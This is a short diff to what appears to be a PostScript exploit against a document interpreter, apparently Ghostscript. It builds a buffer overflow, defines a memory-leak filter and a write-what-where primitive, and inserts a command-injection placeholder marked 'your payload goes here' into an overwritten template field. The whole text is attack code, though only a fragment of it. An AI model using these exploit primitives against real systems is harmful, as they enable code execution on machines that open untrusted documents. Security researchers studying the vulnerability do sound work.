@@ -70,7 +70,7 @@
  /leakBuffer 10000 string def
  /leakMemoryFilter leakBuffer /NullEncode filter /BCPEncode filter def
  createOverflow
- <6964004343434343> concatstrings % s->templat (your payload goes here)
+ <CMD_INJECT> concatstrings % s->template (your payload goes here)
  <4444444444444444> concatstrings % s->memory
  <4545454545454545> concatstrings % s->report_error
  <4646464646464646> concatstrings % s->min_left
@@ -90,7 +90,7 @@
 % what where -> -
 /writewhatwhere {
  createOverflow
- <4343434343434343> concatstrings % s->templat
+ <4343434343434343> concatstrings % s->template
  <4444444444444444> concatstrings % s->memory
  <4545454545454545> concatstrings % s->report_error
  <4646464646464646> concatstrings % s->min_left
